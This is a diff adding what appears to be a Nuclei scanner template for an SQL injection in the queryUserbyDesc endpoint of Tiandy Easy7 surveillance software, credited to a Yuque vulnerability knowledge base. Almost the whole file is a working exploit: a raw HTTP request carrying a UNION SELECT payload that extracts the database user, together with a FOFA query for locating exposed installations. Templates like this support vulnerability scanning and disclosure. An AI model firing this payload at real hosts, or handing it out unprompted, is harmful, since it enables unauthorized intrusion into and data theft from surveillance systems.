@@ -1,0 +1,33 @@
+id: poc-mc4wiw4w1t1yax64
+info:
+  name: 天地伟业Easy7 queryUserbyDesc 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mc4wiw4w1t1yax64'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mc4wiw4w1t1yax64
+    fofa: app="Tiandy-Easy7"
+http:
+- raw:
+  - 'GET /Easy7/rest/user/queryUserbyDesc?userDesc=1''+UNION+ALL+SELECT+CONCAT(0x7e,USER(),0x7e),41,41--+- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
